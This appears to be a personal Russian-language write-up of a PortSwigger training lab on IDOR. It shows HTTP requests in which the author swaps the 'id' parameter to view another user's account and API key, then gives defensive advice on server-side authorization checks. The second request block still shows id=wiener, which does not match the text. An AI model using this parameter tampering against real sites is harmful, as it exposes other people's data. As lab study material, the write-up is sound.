
Горизонтальная эскалация привилегий происходит, если пользователь может получить доступ к ресурсам, принадлежащим другому пользователю

лаба https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter

задание: получить ключ API для пользователя `carlos`

-----

вот запрос для моего аккаунта

```http
GET /my-account?id=wiener HTTP/2
Host: 0abb00d204e70cd480cbda5600160006.web-security-academy.net
Cookie: session=MmND71TSnjnq5OBCEk67Z1PoNUJf5SlV
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0abb00d204e70cd480cbda5600160006.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```


пробую просто поменять с id=wiener на id=carlos

```http
GET /my-account?id=wiener HTTP/2
Host: 0abb00d204e70cd480cbda5600160006.web-security-academy.net
Cookie: session=MmND71TSnjnq5OBCEk67Z1PoNUJf5SlV
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0abb00d204e70cd480cbda5600160006.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```


получилось, лаба - уровень детский сад
но это база...

я попал на страницу карлоса!

вот его апи ключ
cXvRBdjuLuJy9vSoFRb93a2xdvwxwTcZ

-------

#### вывод, 

лаба показала классический IDOR (Insecure Direct Object Reference). Сервер доверяет параметру `id` из запроса и не проверяет, принадлежит ли запрашиваемый аккаунт тому пользователю, чья сессия используется. 
Просто подменил `wiener` на `carlos` и получил чужие данные

#### защита от такого:

никогда не доверять пользовательскому вводу при доступе к объектам. сервер должен проверять, имеет ли текущий пользователь права на запрашиваемый ресурс. нельзя полагаться на то, что параметры вроде `id` не будут изменены.

для авторизованных запросов идентификатор пользователя должен браться из сессии, а не из параметров запроса. если нужно передать чужой id (например, для админки), то проверка прав должна быть строгой и явной
